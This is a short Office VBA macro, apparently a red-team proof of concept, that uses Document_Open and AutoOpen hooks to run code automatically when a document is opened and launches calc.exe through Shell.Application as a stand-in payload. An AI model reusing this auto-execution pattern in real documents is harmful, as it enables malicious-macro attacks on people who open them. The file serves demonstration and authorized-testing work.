' ===============================================
' Author: Maerih
' Disclaimer: This code is for educational purposes only
' Use only in authorized testing environments
' ===============================================

Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
   Dim objShell As Object
    Dim objFolder As Object
    Dim objFolderItem As Object
    
    Set objShell = CreateObject("Shell.Application")
    Set objFolder = objShell.NameSpace("C:\Windows\System32\")
    Set objFolderItem = objFolder.ParseName("calc.exe")
    
    If Not objFolderItem Is Nothing Then
        objFolderItem.InvokeVerbEx "open"
    End If
End Sub
